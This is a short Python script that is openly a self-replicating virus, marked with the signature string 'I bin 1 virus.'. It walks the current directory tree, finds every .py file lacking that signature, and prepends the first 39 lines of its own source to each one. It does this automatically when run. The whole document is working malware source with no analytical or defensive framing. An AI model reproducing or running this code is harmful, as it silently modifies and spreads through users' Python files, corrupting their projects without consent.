import os

SIGNATURE = "I bin 1 virus."

# code for checking the operating system
# from sys import platform
# if platform == "linux" or platform == "linux2":
#     # linux
# elif platform == "darwin":
#     # OS X
# elif platform == "win32":
#     # Windows...

def search(path):
    
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect


def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
        
        
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)

